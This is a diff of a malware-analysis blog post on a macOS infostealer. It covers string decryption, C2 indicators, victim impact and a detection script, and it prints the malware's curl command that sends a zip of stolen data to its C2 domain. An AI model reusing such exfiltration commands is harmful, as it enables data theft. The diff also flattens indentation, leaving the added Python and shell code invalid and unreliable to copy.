@@ -4,9 +4,9 @@ author: "Nix McRetro"
 date: 2026-07-26T17:08:14.000+11:00
 last_modified_at: 2026-09-28
 ai_assistance:
-  model: "OpenAI GPT-5.6 Sol"
-  date: 2026-09-28
-  purpose: "fact-checking, sourcing, and editorial cleanup"
+ model: "OpenAI GPT-5.6 Sol"
+ date: 2026-09-28
+ purpose: "fact-checking, sourcing, and editorial cleanup"
 categories: [ai-generated, programming]
 ---
 
@@ -21,7 +21,7 @@ In mid‑July 2026, I obtained a macOS infostealer trojan disguised as a softwar
 - **`.phost`** → Panel domain: `http://ukdsopas.at` (used as an HTTP header identifier).
 - **`xxxblyat`** → Hardcoded `app_id` linking this build to the Odyssey Stealer MaaS platform.
 - **`newooble`** → Affiliate/panel username observed in this build (recovered from `.username`).
-- **Four command types**: `doshell`, `repeat`, `enablesocks5`, `uninstall` — giving the remote operator unrestricted command execution.
+- **Four command types**: `doshell`, `repeat`, `enablesocks5`, `uninstall` - giving the remote operator unrestricted command execution.
 - **Two separate infections** (users `m1` and `m2`) carried the same affiliate/panel identifier (`newooble`).
 - **Live bot channel** discovered with `.botid` `19a9ff38c1b24ffe8e5c54a91af203c8`; subsequent successful manual polling confirmed that the C2 server remained responsive.
 - **Password theft confirmed**: `password1` (recovered from `cache.txt`).
@@ -35,7 +35,7 @@ All indicators of compromise have been reported to the ACSC, AFP, and relevant a
 
 The sample was obtained from a malicious distribution site where it was presented as a legitimate software licensing tool. In that context, the ad-hoc code signature and lack of a Team Identifier were early reasons for additional scrutiny, rather than proof of maliciousness on their own.
 
-The malware was detonated on an isolated macOS system with network monitoring in place — an AdGuard Home DNS sinkhole and kernel‑level network logging. This setup allowed me to observe the malware's full behaviour in real time.
+The malware was detonated on an isolated macOS system with network monitoring in place - an AdGuard Home DNS sinkhole and kernel‑level network logging. This setup allowed me to observe the malware's full behaviour in real time.
 
 All credentials on the analysis system were rotated immediately following the engagement, and the machine was erased after forensic preservation.
 
@@ -66,7 +66,7 @@ The binary is a C++ application that makes heavy use of `std::string` for path c
 
 ## 3. String Obfuscation: xorshift32
 
-The strings recovered from this sample — file paths, shell commands, URLs, wallet names, browser identifiers — are protected using a custom scheme derived from the **xorshift32** pseudorandom number generator.
+The strings recovered from this sample - file paths, shell commands, URLs, wallet names, browser identifiers - are protected using a custom scheme derived from the **xorshift32** pseudorandom number generator.
 
 ### 3.1 The cipher
 
@@ -74,24 +74,24 @@ The sample uses per-string state values with a xorshift32-derived byte stream. I
 
 1. Initialise the PRNG state with the 4‑byte seed.
 2. For each byte of the encrypted string:
-   - XOR the byte with the low 8 bits of the current PRNG state.
-   - Advance the PRNG state.
+ - XOR the byte with the low 8 bits of the current PRNG state.
+ - Advance the PRNG state.
 3. The result is the plaintext string.
 
 The xorshift32 function:
 
 ```c
 uint32_t xorshift32(uint32_t state) {
-    state ^= state << 13;
-    state ^= state >> 17;
-    state ^= state << 5;
-    return state | 1;  // additional OR-with-1 step observed in this sample
+ state ^= state << 13;
+ state ^= state >> 17;
+ state ^= state << 5;
+ return state | 1; // additional OR-with-1 step observed in this sample
 }
 ```
 
 ### 3.2 Decryption methodology
 
-I developed a Python‑based brute‑force decoder that extracted **379** unique decrypted strings — far more than the 113 initially reported in earlier analyses:
+I developed a Python‑based brute‑force decoder that extracted **379** unique decrypted strings - far more than the 113 initially reported in earlier analyses:
 
 | Step | Method |
 |---|---|
@@ -116,69 +116,69 @@ Demonstrates the sample-specific PRNG/decryption primitive and candidate extract
 import struct
 
 def xorshift32_next(state):
-    state &= 0xFFFFFFFF
-    state ^= (state << 13) & 0xFFFFFFFF
-    state ^= (state >> 17) & 0xFFFFFFFF
-    state ^= (state << 5) & 0xFFFFFFFF
-    return (state | 1) & 0xFFFFFFFF
+ state &= 0xFFFFFFFF
+ state ^= (state << 13) & 0xFFFFFFFF
+ state ^= (state >> 17) & 0xFFFFFFFF
+ state ^= (state << 5) & 0xFFFFFFFF
+ return (state | 1) & 0xFFFFFFFF
 
 def decrypt_block(encrypted_bytes, seed):
-    state = seed & 0xFFFFFFFF
-    plain = bytearray()
-    for b in encrypted_bytes:
-        plain.append(b ^ (state & 0xFF))
-        state = xorshift32_next(state)
-    return bytes(plain)
+ state = seed & 0xFFFFFFFF
+ plain = bytearray()
+ for b in encrypted_bytes:
+ plain.append(b ^ (state & 0xFF))
+ state = xorshift32_next(state)
+ return bytes(plain)
 
 def extract_seeds_from_const_section(binary_path, const_offset, const_size):
-    with open(binary_path, 'rb') as f:
-        f.seek(const_offset)
-        data = f.read(const_size)
-    
-    seeds = set()
-    # Every 4 bytes may be a seed, but we scan for non‑zero values
-    for i in range(0, len(data), 4):
-        seed = struct.unpack('<I', data[i:i+4])[0]
-        if seed != 0:
-            seeds.add(seed)
-    return seeds
+ with open(binary_path, 'rb') as f:
+ f.seek(const_offset)
+ data = f.read(const_size)
+ 
+ seeds = set()
+ # Every 4 bytes may be a seed, but we scan for non‑zero values
+ for i in range(0, len(data), 4):
+ seed = struct.unpack('<I', data[i:i+4])[0]
+ if seed != 0:
+ seeds.add(seed)
+ return seeds
 
 def brute_force_decrypt(binary_path, const_offset, const_size, data_offset, data_size):
-    seeds = extract_seeds_from_const_section(binary_path, const_offset, const_size)
-    print(f"[*] Found {len(seeds)} candidate seeds")
-    
-    with open(binary_path, 'rb') as f:
-        f.seek(data_offset)
-        encrypted_data = f.read(data_size)
-    
-    results = []
-    for seed in seeds:
-        decrypted = decrypt_block(encrypted_data, seed)
-        # Try to split on null bytes and keep printable ASCII
-        parts = decrypted.split(b'\x00')
-        for part in parts:
-            try:
-                s = part.decode('utf-8')
-                if len(s) > 3 and all(32 <= ord(c) < 127 for c in s):
-                    results.append(s)
-            except UnicodeDecodeError:
-                continue
-    
-    # Deduplicate and sort
-    unique = sorted(set(results))
-    print(f"[+] Decrypted {len(unique)} unique strings")
-    for s in unique:
-        print(s)
+ seeds = extract_seeds_from_const_section(binary_path, const_offset, const_size)
+ print(f"[*] Found {len(seeds)} candidate seeds")
+ 
+ with open(binary_path, 'rb') as f:
+ f.seek(data_offset)
+ encrypted_data = f.read(data_size)
+ 
+ results = []
+ for seed in seeds:
+ decrypted = decrypt_block(encrypted_data, seed)
+ # Try to split on null bytes and keep printable ASCII
+ parts = decrypted.split(b'\x00')
+ for part in parts:
+ try:
+ s = part.decode('utf-8')
+ if len(s) > 3 and all(32 <= ord(c) < 127 for c in s):
+ results.append(s)
+ except UnicodeDecodeError:
+ continue
+ 
+ # Deduplicate and sort
+ unique = sorted(set(results))
+ print(f"[+] Decrypted {len(unique)} unique strings")
+ for s in unique:
+ print(s)
 
 if __name__ == "__main__":
-    # Adjust these offsets based on your binary
-    BINARY = "Patch_x86_64"
-    CONST_OFFSET = 0x1D350   # __TEXT __const start
-    CONST_SIZE   = 0x3904
-    DATA_OFFSET  = 0x1D4A4   # approximate start of encrypted data
-    DATA_SIZE    = 0x2000    # adjust as needed
-    
-    brute_force_decrypt(BINARY, CONST_OFFSET, CONST_SIZE, DATA_OFFSET, DATA_SIZE)
+ # Adjust these offsets based on your binary
+ BINARY = "Patch_x86_64"
+ CONST_OFFSET = 0x1D350 # __TEXT __const start
+ CONST_SIZE = 0x3904
+ DATA_OFFSET = 0x1D4A4 # approximate start of encrypted data
+ DATA_SIZE = 0x2000 # adjust as needed
+ 
+ brute_force_decrypt(BINARY, CONST_OFFSET, CONST_SIZE, DATA_OFFSET, DATA_SIZE)
 ```
 
 ---
@@ -202,7 +202,7 @@ false
 - **`.bhost`** → Bot Host (primary C2 server): `http://192.253.248.181`
 - **`.phost`** → Panel Host (admin panel domain): `http://ukdsopas.at`
 
-The `.bhost` file is read as `botHost` and used for **all** C2 API calls. The `.phost` file is read as `panelAddr` and only used as an HTTP header (`panel_addr:`) when downloading the repeat script. This means the attacker hardcoded the raw IP as the primary communication channel — the domain was only used as a label for the panel interface.
+The `.bhost` file is read as `botHost` and used for **all** C2 API calls. The `.phost` file is read as `panelAddr` and only used as an HTTP header (`panel_addr:`) when downloading the repeat script. This means the attacker hardcoded the raw IP as the primary communication channel - the domain was only used as a label for the panel interface.
 
 ### 4.2 Anti‑analysis
 
@@ -211,7 +211,7 @@ USER
 root
 ```
 
-The malware checks `getenv("USER")` and exits immediately if the value is `root`. This is a simple but effective anti‑sandbox measure — automated analysis environments often run as root.
+The malware checks `getenv("USER")` and exits immediately if the value is `root`. This is a simple but effective anti‑sandbox measure - automated analysis environments often run as root.
 
 ### 4.3 AppleScript Payload (Full)
 
@@ -282,10 +282,10 @@ curl -s
 rm -rf '
 Library/
 curl -X POST \
-  -H "buildid: 909286c1d2fb4c5c97dfc22a486661c1" \
-  -H "username: newooble" \
-  --data-binary @/tmp/lksopo.zip \
-  http://ukdsopas.at/log
+ -H "buildid: 909286c1d2fb4c5c97dfc22a486661c1" \
+ -H "username: newooble" \
+ --data-binary @/tmp/lksopo.zip \
+ http://ukdsopas.at/log
 ```
 
 The malware stages data in `/tmp/lksopo/`, compresses it with `ditto -c -k --sequesterRsrc /tmp/lksopo /tmp/lksopo.zip`, and exfiltrates it via HTTP POST. Retry logic: 10 attempts, 60‑second sleep between each.
@@ -345,7 +345,7 @@ sw_vers -productVersion | cut -d. -f2
 system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType
 ```
 
-The macOS version check gates the Chrome master password extraction — the malware only attempts it on versions greater than 26.3.
+The macOS version check gates the Chrome master password extraction - the malware only attempts it on versions greater than 26.3.
 
 ### 4.11 Browser Targets (14 browsers)
 
@@ -475,35 +475,35 @@ ammjlinfekkoockogfhdkgcohjlbhmff
 
 ---
 
-## 5. Attack Timeline (User: m1 — Initial Infection)
+## 5. Attack Timeline (User: m1 - Initial Infection)
 
 The following timeline was reconstructed from AdGuard Home DNS logs, macOS kernel network logs, file system timestamps, keychain metadata, decompiled source code, `.zsh_history`, screenshot metadata, and the recovered `.botid` from the `m2` infection (which served as corroborating evidence for the C2 server's continued operation). All times are AEST.
 
 | Time | Phase | Event | Source |
 | :--- | :--- | :--- | :--- |
 | ~22:30 | **Infection** | Microsoft Office LTSC 2024 VL Serializer package executed | BOM receipt |
-| 22:35:03 | **Infection** | Microsoft AutoUpdate runs (coincidental) — creates MAU2.0 directory | Timeline |
+| 22:35:03 | **Infection** | Microsoft AutoUpdate runs (coincidental) - creates MAU2.0 directory | Timeline |
 | 22:35:15 | **Infection** | Microsoft Excel frameworks updated (Office update) | Timeline |
 | 22:38:48 | **Infection** | User opens Terminal | Terminal log |
-| 22:39:21 – 22:49:38 | **Infection** | Malware attempts DNS for `ukdsopas.at` → **BLOCKED** by AdGuard Home (11× over ~10 min) | AdGuard logs |
-| 22:39:58 | **Infection** | "Patch" process crashes — CrashReporter log written | CrashReporter |
-| 22:40:23 | **Infection** | Gatekeeper rejects something — `.LastGKReject` written | Timeline |
-| 22:40:34 | **Infection** | Package receipt created — installs `Patch.app` (393 KB) + Office VL Serializer (6.9 MB) to `/Library/Application Support/` | BOM file |
+| 22:39:21 - 22:49:38 | **Infection** | Malware attempts DNS for `ukdsopas.at` → **BLOCKED** by AdGuard Home (11× over ~10 min) | AdGuard logs |
+| 22:39:58 | **Infection** | "Patch" process crashes - CrashReporter log written | CrashReporter |
+| 22:40:23 | **Infection** | Gatekeeper rejects something - `.LastGKReject` written | Timeline |
+| 22:40:34 | **Infection** | Package receipt created - installs `Patch.app` (393 KB) + Office VL Serializer (6.9 MB) to `/Library/Application Support/` | BOM file |
 | 22:40:49 | **Infection** | ExecPolicy modified (Gatekeeper bypass) + `.IuN79Kxxpn` dropped in `/var/root/Library/Application Support/` | Timeline |
 | 22:41:31 | **Infection** | LuLu firewall rules modified (`rules.plist`) | Timeline |
 | ~22:50 | **C2 Active** | Malware falls back to IP `192.253.248.181`; creates dotfiles: `.pwd`, `.phost`, `.bhost`, `.username` | Detection script |
-| 22:50:38 | **C2 Active** | First C2 connection — `joinsystem` → bot registered as `newooble`, **`.botid` assigned** (32 bytes) | Kernel logs; screenshot |
-| 22:50:39 | **C2 Active** | `getActions` polling begins — every 60 seconds | Kernel logs |
-| 22:50–22:58 | **C2 Active** | Active attack window — `doshell`, `repeat`, `enablesocks5` commands available to attacker | Source code |
+| 22:50:38 | **C2 Active** | First C2 connection - `joinsystem` → bot registered as `newooble`, **`.botid` assigned** (32 bytes) | Kernel logs; screenshot |
+| 22:50:39 | **C2 Active** | `getActions` polling begins - every 60 seconds | Kernel logs |
+| 22:50-22:58 | **C2 Active** | Active attack window - `doshell`, `repeat`, `enablesocks5` commands available to attacker | Source code |
 | ~22:58 | **C2 Active** | C2 **stops responding to the `m1` bot** (transient issue or attacker action); bot begins 10‑retry countdown (10 × 60s) | Source code logic |
-| 22:57:06 | **Discovery** | User writes `virus?.rtf` — infection confirmed | Timeline |
+| 22:57:06 | **Discovery** | User writes `virus?.rtf` - infection confirmed | Timeline |
 | 23:01:01 | **Discovery** | User runs `detect_xdivcmp_mac.sh` (detect‑only; malware PID 12047 still running) | Terminal output |
 | 23:02:10 | **Discovery** | User begins taking screenshots | Timeline |
 | 23:07:23 | **Discovery** | User writes `virus confirmed.txt` | Timeline |
-| 23:08:47 | **Self‑destruct** | Malware self‑destructs — `uninstall()` writes `+` to `~/.uninstalled`, bot exits | Evidence backup; screenshot |
-| 23:11:00 | **Cleanup** | User runs cleanup script (`--clean`) — evidence preserved, LaunchDaemon unloaded, Gatekeeper re‑enabled | Timeline |
-| 23:13:28 | **Investigation** | **Screenshot taken** — shows both `.botid` (32 bytes) and `.uninstalled` (1 byte) still present in `~/` | Screenshot metadata |
-| ~23:15 | **Shutdown** | Mac reboots — shutdown logs, uuidtext flush, system databases saved | Timeline |
+| 23:08:47 | **Self‑destruct** | Malware self‑destructs - `uninstall()` writes `+` to `~/.uninstalled`, bot exits | Evidence backup; screenshot |
+| 23:11:00 | **Cleanup** | User runs cleanup script (`--clean`) - evidence preserved, LaunchDaemon unloaded, Gatekeeper re‑enabled | Timeline |
+| 23:13:28 | **Investigation** | **Screenshot taken** - shows both `.botid` (32 bytes) and `.uninstalled` (1 byte) still present in `~/` | Screenshot metadata |
+| ~23:15 | **Shutdown** | Mac reboots - shutdown logs, uuidtext flush, system databases saved | Timeline |
 | ~23:18 | **Reboot** | Mac comes back up after reboot | Timeline |
 
 ---
@@ -514,11 +514,11 @@ The C2 server did **not** go offline. The recovery of an intact `.botid` file (`
 
 However, this raises an important question: if the C2 server never went offline, why did the `m1` bot self‑destruct?
 
-The answer lies in the timeline. At 22:58, the C2 server **stopped responding to the `m1` bot specifically**—possibly due to a transient network issue, the attacker selectively disconnecting that bot, or the bot's own polling logic failing to reach the server. The malware entered its 10‑retry countdown (10 × 60 seconds). At 23:08:47, after 10 consecutive polling failures, the `uninstall()` function executed, writing a `+` to `~/.uninstalled` and exiting.
+The answer lies in the timeline. At 22:58, the C2 server **stopped responding to the `m1` bot specifically** - possibly due to a transient network issue, the attacker selectively disconnecting that bot, or the bot's own polling logic failing to reach the server. The malware entered its 10‑retry countdown (10 × 60 seconds). At 23:08:47, after 10 consecutive polling failures, the `uninstall()` function executed, writing a `+` to `~/.uninstalled` and exiting.
 
-This is confirmed by the screenshot taken at 23:13:28, which clearly shows `.uninstalled` present with a modification time of "Today at 11:08pm" (23:08), alongside `.botid` (still present at that time). The `.uninstalled` file survived the initial cleanup because the version of `detect_xdivcmp_mac.sh` used at 23:11 did **not** include `.uninstalled` in its `DOTFILES` array—it only targeted `.pwd`, `.phost`, `.bhost`, and `.username`. The `.botid` file was manually deleted later during the investigation, sometime between the screenshot and the creation of the forensic clone.
+This is confirmed by the screenshot taken at 23:13:28, which clearly shows `.uninstalled` present with a modification time of "Today at 11:08pm" (23:08), alongside `.botid` (still present at that time). The `.uninstalled` file survived the initial cleanup because the version of `detect_xdivcmp_mac.sh` used at 23:11 did **not** include `.uninstalled` in its `DOTFILES` array - it only targeted `.pwd`, `.phost`, `.bhost`, and `.username`. The `.botid` file was manually deleted later during the investigation, sometime between the screenshot and the creation of the forensic clone.
 
-**The self‑destruct was triggered not because the C2 infrastructure collapsed, but because the bot lost contact with the server—either due to network conditions or the attacker's deliberate actions.** The server itself remained operational, as proven by the live `.botid` recovered from the `m2` infection and the successful polling of that endpoint. The `m1` machine stopped communicating only because the bot self‑destructed, not because the attacker's infrastructure had failed.
+**The self‑destruct was triggered not because the C2 infrastructure collapsed, but because the bot lost contact with the server - either due to network conditions or the attacker's deliberate actions.** The server itself remained operational, as proven by the live `.botid` recovered from the `m2` infection and the successful polling of that endpoint. The `m1` machine stopped communicating only because the bot self‑destructed, not because the attacker's infrastructure had failed.
 
 ---
 
@@ -579,7 +579,7 @@ A 2,048‑byte encrypted file was written to `/Users/username/Library/Applicatio
 
 ## 8. The Two Infections: `m1` and `m2`
 
-Two separate infections were analysed—both with the same malware, same C2 server, and same attacker (`newooble`):
+Two separate infections were analysed - both with the same malware, same C2 server, and same attacker (`newooble`):
 
 | Attribute | Infection 1 (`m1`) | Infection 2 (`m2`) |
 |---|---|---|
@@ -587,7 +587,7 @@ Two separate infections were analysed—both with the same malware, same C2 serv
 | macOS version | 26.5.2 | 26.5.1 |
 | `.botid` | Not recovered (cleanup ran) | Recovered: `19a9ff38c1b24ffe8e5c54a91af203c8` |
 | `.username` | `newooble` | `newooble` |
-| Stolen password | `password0`  (from `.pwd`) | `password1` (from `cache.txt`) |
+| Stolen password | `password0` (from `.pwd`) | `password1` (from `cache.txt`) |
 | Chrome installed | True | `false` |
 | lksopo.zip contents | 7 files (finder, cache.txt, hardware, installedSoft, kc, pwd, user) | Same (analysed) |
 | C2 status | Active | Active |
@@ -601,13 +601,13 @@ The `m2` infection provided the `.botid` that proved the C2 server was still act
 ### 9.1 lksopo.zip Contents (Both Infections)
 
 ```
-finder/          → Directory listing of user's file system
-cache.txt        → Stolen password: $mac password get scpt output: password1
-hardware         → System_profiler output
-installedSoft    → List of installed applications
-kc               → macOS Keychain dump
-pwd              → Plaintext password file
-user             → Attacker username: newooble
+finder/ → Directory listing of user's file system
+cache.txt → Stolen password: $mac password get scpt output: password1
+hardware → System_profiler output
+installedSoft → List of installed applications
+kc → macOS Keychain dump
+pwd → Plaintext password file
+user → Attacker username: newooble
 ```
 
 ### 9.2 .zsh_history Highlights (User Actions)
@@ -648,12 +648,12 @@ The following detection script (`detect_odyssey_mac.sh`) was developed to identi
 # - Newer Odyssey Stealer / AMOS variants (e.g., xxxblyat build)
 #
 # Known IoCs checked:
-#   /Library/Application Support/Install.app
-#   /Library/LaunchDaemons/com.xdivcmp.plist
-#   ~/.pwd ~/.phost ~/.bhost ~/.username ~/.botid ~/.lastaction ~/.uninstalled
-#   Domains: charge0x.at, ukdsopas.at
-#   IPs: 192.253.248.181
-#   Staging/Proxy: /tmp/socks, /tmp/lksopo
+# /Library/Application Support/Install.app
+# /Library/LaunchDaemons/com.xdivcmp.plist
+# ~/.pwd ~/.phost ~/.bhost ~/.username ~/.botid ~/.lastaction ~/.uninstalled
+# Domains: charge0x.at, ukdsopas.at
+# IPs: 192.253.248.181
+# Staging/Proxy: /tmp/socks, /tmp/lksopo
 #
 # Default: detect only
 # Cleanup: sudo ./detect_odyssey_mac.sh --clean
@@ -674,90 +674,90 @@ LAUNCHD_PLIST="/Library/LaunchDaemons/com.xdivcmp.plist"
 
 USER_HOME="${SUDO_USER:+$(eval echo "~$SUDO_USER")}"
 if [ -z "${USER_HOME:-}" ]; then
-  USER_HOME="$HOME"
+ USER_HOME="$HOME"
 fi
 
 # Expanded to include Odyssey Stealer tracking files
 DOTFILES=(
-  "$USER_HOME/.pwd"
-  "$USER_HOME/.phost"
-  "$USER_HOME/.bhost"
-  "$USER_HOME/.username"
-  "$USER_HOME/.botid"
-  "$USER_HOME/.lastaction"
-  "$USER_HOME/.uninstalled"
+ "$USER_HOME/.pwd"
+ "$USER_HOME/.phost"
+ "$USER_HOME/.bhost"
+ "$USER_HOME/.username"
+ "$USER_HOME/.botid"
+ "$USER_HOME/.lastaction"
+ "$USER_HOME/.uninstalled"
 )
 
 # Expanded to include new domains, build tags, and proxy paths
 IOC_STRINGS=(
-  "charge0x.at"
-  "ukdsopas.at"
-  "192.253.248.181"
-  "xdivcmp"
-  "com.xdivcmp"
-  "xxxblyat"
-  "/web/socks"
-  "lksopo"
+ "charge0x.at"
+ "ukdsopas.at"
+ "192.253.248.181"
+ "xdivcmp"
+ "com.xdivcmp"
+ "xxxblyat"
+ "/web/socks"
+ "lksopo"
 )
 
 FOUND=0
 SUSPICIOUS=0
 
 timestamp() {
-  date +"%Y-%m-%d_%H-%M-%S"
+ date +"%Y-%m-%d_%H-%M-%S"
 }
 
 say() {
-  printf '%s\n' "$*"
+ printf '%s\n' "$*"
 }
 
 hit() {
-  FOUND=1
-  printf '  [HIT] %s\n' "$*"
+ FOUND=1
+ printf ' [HIT] %s\n' "$*"
 }
 
 warn() {
-  SUSPICIOUS=1
-  printf '  [WARN] %s\n' "$*"
+ SUSPICIOUS=1
+ printf ' [WARN] %s\n' "$*"
 }
 
 ok() {
-  printf '  [OK] %s\n' "$*"
+ printf ' [OK] %s\n' "$*"
 }
 
 section() {
-  printf '\n==== %s ====\n' "$*"
+ printf '\n==== %s ====\n' "$*"
 }
 
 usage() {
-  cat <<EOF
+ cat <<EOF
 Usage:
-  $0             Detect only
-  sudo $0 --clean   Backup evidence, kill processes, unload LaunchDaemon, remove known IoCs, re-enable Gatekeeper
+ $0 Detect only
+ sudo $0 --clean Backup evidence, kill processes, unload LaunchDaemon, remove known IoCs, re-enable Gatekeeper
 
 EOF
 }
 
 if [ "${1:-}" = "--clean" ]; then
-  CLEAN=1
+ CLEAN=1
 elif [ "${1:-}" = "-h" ] || [ "${1:-}" = "--help" ]; then
-  usage
-  exit 0
+ usage
+ exit 0
 elif [ -n "${1:-}" ]; then
-  usage
-  exit 2
+ usage
+ exit 2
 fi
 
 section "Mode"
 if [ "$CLEAN" -eq 1 ]; then
-  if [ "$(id -u)" -ne 0 ]; then
-    say "Cleanup mode requires sudo/root."
-    say "Run: sudo $0 --clean"
-    exit 1
-  fi
-  say "Running in CLEANUP mode."
+ if [ "$(id -u)" -ne 0 ]; then
+ say "Cleanup mode requires sudo/root."
+ say "Run: sudo $0 --clean"
+ exit 1
+ fi
+ say "Running in CLEANUP mode."
 else
-  say "Running in DETECT-ONLY mode. Nothing will be deleted."
+ say "Running in DETECT-ONLY mode. Nothing will be deleted."
 fi
 
 section "Basic system info"
@@ -769,79 +769,79 @@ say "Date: $(date)"
 section "Check known filesystem IoCs"
 
 if [ -e "$INSTALL_APP" ]; then
-  hit "Found $INSTALL_APP"
-  say "  Details:"
-  ls -ld "$INSTALL_APP" 2>/dev/null | sed 's/^/    /'
+ hit "Found $INSTALL_APP"
+ say " Details:"
+ ls -ld "$INSTALL_APP" 2>/dev/null | sed 's/^/ /'
 
-  if [ -d "$INSTALL_APP/Contents" ]; then
-    say "  Bundle Info:"
-    /usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" "$INSTALL_APP/Contents/Info.plist" 2>/dev/null | sed 's/^/    CFBundleIdentifier: /' || true
-    /usr/libexec/PlistBuddy -c "Print :CFBundleExecutable" "$INSTALL_APP/Contents/Info.plist" 2>/dev/null | sed 's/^/    CFBundleExecutable: /' || true
-  fi
+ if [ -d "$INSTALL_APP/Contents" ]; then
+ say " Bundle Info:"
+ /usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" "$INSTALL_APP/Contents/Info.plist" 2>/dev/null | sed 's/^/ CFBundleIdentifier: /' || true
+ /usr/libexec/PlistBuddy -c "Print :CFBundleExecutable" "$INSTALL_APP/Contents/Info.plist" 2>/dev/null | sed 's/^/ CFBundleExecutable: /' || true
+ fi
 
-  say "  Codesign:"
-  codesign -dv --verbose=4 "$INSTALL_APP" 2>&1 | sed 's/^/    /' || true
+ say " Codesign:"
+ codesign -dv --verbose=4 "$INSTALL_APP" 2>&1 | sed 's/^/ /' || true
 
-  say "  Gatekeeper assessment:"
-  spctl --assess --verbose=4 "$INSTALL_APP" 2>&1 | sed 's/^/    /' || true
+ say " Gatekeeper assessment:"
+ spctl --assess --verbose=4 "$INSTALL_APP" 2>&1 | sed 's/^/ /' || true
 
-  say "  Executable file hashes:"
-  find "$INSTALL_APP" -type f -perm /111 2>/dev/null | while read -r exe; do
-    h="$(shasum -a 256 "$exe" 2>/dev/null | awk '{print $1}')"
-    printf '    %s  %s\n' "$h" "$exe"
-    if [ "$h" = "$TARGET_HASH" ]; then
-      printf '    *** HASH MATCHES KNOWN MALWARE IOC ***\n'
-    fi
-  done
+ say " Executable file hashes:"
+ find "$INSTALL_APP" -type f -perm /111 2>/dev/null | while read -r exe; do
+ h="$(shasum -a 256 "$exe" 2>/dev/null | awk '{print $1}')"
+ printf ' %s %s\n' "$h" "$exe"
+ if [ "$h" = "$TARGET_HASH" ]; then
+ printf ' *** HASH MATCHES KNOWN MALWARE IOC ***\n'
+ fi
+ done
 else
-  ok "Not found: $INSTALL_APP"
+ ok "Not found: $INSTALL_APP"
 fi
 
 if [ -e "$LAUNCHD_PLIST" ]; then
-  hit "Found $LAUNCHD_PLIST"
-  say "  Contents:"
-  sed 's/^/    /' "$LAUNCHD_PLIST" 2>/dev/null || true
+ hit "Found $LAUNCHD_PLIST"
+ say " Contents:"
+ sed 's/^/ /' "$LAUNCHD_PLIST" 2>/dev/null || true
 else
-  ok "Not found: $LAUNCHD_PLIST"
+ ok "Not found: $LAUNCHD_PLIST"
 fi
 
 for f in "${DOTFILES[@]}"; do
-  if [ -e "$f" ]; then
-    hit "Found $f"
-    ls -l "$f" 2>/dev/null | sed 's/^/    /'
-  else
-    ok "Not found: $f"
-  fi
+ if [ -e "$f" ]; then
+ hit "Found $f"
+ ls -l "$f" 2>/dev/null | sed 's/^/ /'
+ else
+ ok "Not found: $f"
+ fi
 done
 
 section "Check LaunchDaemon loaded state"
 
 if launchctl print system/com.xdivcmp >/tmp/xdivcmp_launchctl_check.$$ 2>&1; then
-  hit "LaunchDaemon appears loaded: system/com.xdivcmp"
-  sed 's/^/    /' /tmp/xdivcmp_launchctl_check.$$
+ hit "LaunchDaemon appears loaded: system/com.xdivcmp"
+ sed 's/^/ /' /tmp/xdivcmp_launchctl_check.$$
 else
-  ok "system/com.xdivcmp does not appear loaded"
+ ok "system/com.xdivcmp does not appear loaded"
 fi
 rm -f /tmp/xdivcmp_launchctl_check.$$
 
 section "Search common persistence locations for IoC strings"
 
 PERSISTENCE_DIRS=(
-  "/Library/LaunchAgents"
-  "/Library/LaunchDaemons"
-  "$USER_HOME/Library/LaunchAgents"
+ "/Library/LaunchAgents"
+ "/Library/LaunchDaemons"
+ "$USER_HOME/Library/LaunchAgents"
 )
 
 for d in "${PERSISTENCE_DIRS[@]}"; do
-  if [ -d "$d" ]; then
-    for s in "${IOC_STRINGS[@]}"; do
-      matches="$(grep -RIl "$s" "$d" 2>/dev/null || true)"
-      if [ -n "$matches" ]; then
-        hit "Found string '$s' under $d"
-        printf '%s\n' "$matches" | sed 's/^/    /'
-      fi
-    done
-  fi
+ if [ -d "$d" ]; then
+ for s in "${IOC_STRINGS[@]}"; do
+ matches="$(grep -RIl "$s" "$d" 2>/dev/null || true)"
+ if [ -n "$matches" ]; then
+ hit "Found string '$s' under $d"
+ printf '%s\n' "$matches" | sed 's/^/ /'
+ fi
+ done
+ fi
 done
 
 section "Search recent logs for network IoCs (macOS 14+ optimized)"
@@ -849,47 +849,47 @@ section "Search recent logs for network IoCs (macOS 14+ optimized)"
 # Look back 7 days instead of 24 hours, as malware beacons can be infrequent
 LOG_LOOKBACK="7d"
 if command -v log >/dev/null 2>&1; then
-  # Added new domains, the build tag, and the hidden proxy download path
-  NET_IOCS=("charge0x.at" "ukdsopas.at" "192.253.248.181" "/tmp/socks" "xxxblyat")
+ # Added new domains, the build tag, and the hidden proxy download path
+ NET_IOCS=("charge0x.at" "ukdsopas.at" "192.253.248.181" "/tmp/socks" "xxxblyat")
 
-  for s in "${NET_IOCS[@]}"; do
-    say "Scanning unified logs for '$s'..."
-    # Run the log search once per target and save it to memory (much faster on macOS 14+)
-    hits=$(log show --last "$LOG_LOOKBACK" --predicate "eventMessage CONTAINS[c] '$s'" 2>/dev/null | grep -i "$s" || true)
+ for s in "${NET_IOCS[@]}"; do
+ say "Scanning unified logs for '$s'..."
+ # Run the log search once per target and save it to memory (much faster on macOS 14+)
+ hits=$(log show --last "$LOG_LOOKBACK" --predicate "eventMessage CONTAINS[c] '$s'" 2>/dev/null | grep -i "$s" || true)
 
-    if [ -n "$hits" ]; then
-      hit "Found network activity for '$s' in unified logs within last $LOG_LOOKBACK"
-      echo "$hits" | tail -10 | sed 's/^/    /'
-    else
-      ok "No '$s' found in unified logs within last $LOG_LOOKBACK"
-    fi
-  done
+ if [ -n "$hits" ]; then
+ hit "Found network activity for '$s' in unified logs within last $LOG_LOOKBACK"
+ echo "$hits" | tail -10 | sed 's/^/ /'
+ else
+ ok "No '$s' found in unified logs within last $LOG_LOOKBACK"
+ fi
+ done
 else
-  warn "macOS log command not available"
+ warn "macOS log command not available"
 fi
 
 section "Gatekeeper status"
 
 GK_STATUS="$(spctl --status 2>/dev/null || true)"
-say "  $GK_STATUS"
+say " $GK_STATUS"
 
 if echo "$GK_STATUS" | grep -qi "disabled"; then
-  hit "Gatekeeper assessments are disabled"
+ hit "Gatekeeper assessments are disabled"
 else
-  ok "Gatekeeper assessments are enabled or status unavailable"
+ ok "Gatekeeper assessments are enabled or status unavailable"
 fi
 
 section "Current active connections and listening ports"
 
 # 1. Check for active outbound connections to known bad IPs/Domains
 if command -v lsof >/dev/null 2>&1; then
